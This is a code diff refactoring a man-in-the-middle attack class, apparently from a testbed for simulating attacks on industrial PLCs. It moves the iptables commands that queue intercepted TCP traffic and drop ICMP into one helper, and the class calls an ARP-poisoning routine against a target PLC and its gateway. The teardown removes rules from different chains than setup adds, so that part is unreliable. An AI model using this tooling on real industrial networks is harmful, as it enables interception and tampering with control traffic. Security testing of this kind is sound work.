@@ -33,14 +33,6 @@ class MiTMAttack(SyncedAttack):
         # Process object to handle nfqueue
         self.nfqueue_process = None
 
-    def clear_ip_tables(self):
-
-        os.system(f'iptables -t mangle -D INPUT -p tcp -j NFQUEUE --queue-num 1')
-        os.system(f'iptables -t mangle -D FORWARD -p tcp -j NFQUEUE --queue-num 1')
-
-        os.system('iptables -D FORWARD -p icmp -j DROP')
-        os.system('iptables -D INPUT -p icmp -j DROP')
-        os.system('iptables -D OUTPUT -p icmp -j DROP')
 
     def setup(self):
         """
@@ -55,26 +47,7 @@ class MiTMAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
-
-        """"
-        if self.direction == 'source':
-            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1')
-        elif self.direction == 'destination':
-            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1 ')
-        else:
-            self.logger.error('Wrong direction configured, direction must be source or destination')
-            raise DirectionError('Wrong direction configured')
-        """
-
-        self.clear_ip_tables()
-
-        os.system(f'iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
-
-        os.system('iptables -A FORWARD -p icmp -j DROP')
-        os.system('iptables -A INPUT -p icmp -j DROP')
-        os.system('iptables -A OUTPUT -p icmp -j DROP')
+        self.modify_ip_tables(True)
 
         # Launch the ARP poison by sending the required ARP network packets
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
@@ -116,7 +89,7 @@ class MiTMAttack(SyncedAttack):
         self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        self.clear_ip_tables()
+        self.modify_ip_tables(False)
         self.logger.debug(f"Restored ARP")
 
         self.logger.debug("Stopping nfqueue subprocess...")
@@ -131,6 +104,24 @@ class MiTMAttack(SyncedAttack):
         """Polls the NetFilterQueue subprocess and sends a signal to stop it when teardown is called"""
         pass
 
+
+    @staticmethod
+    def modify_ip_tables(append=True):
+
+        if append:
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
+
+            os.system('iptables -A FORWARD -p icmp -j DROP')
+            os.system('iptables -A INPUT -p icmp -j DROP')
+            os.system('iptables -A OUTPUT -p icmp -j DROP')
+        else:
+
+            os.system(f'iptables -t mangle -D INPUT -p tcp -j NFQUEUE --queue-num 1')
+            os.system(f'iptables -t mangle -D FORWARD -p tcp -j NFQUEUE --queue-num 1')
+
+            os.system('iptables -D FORWARD -p icmp -j DROP')
+            os.system('iptables -D INPUT -p icmp -j DROP')
+            os.system('iptables -D OUTPUT -p icmp -j DROP')
 
 def is_valid_file(parser_instance, arg):
     """Verifies whether the intermediate yaml path is valid."""
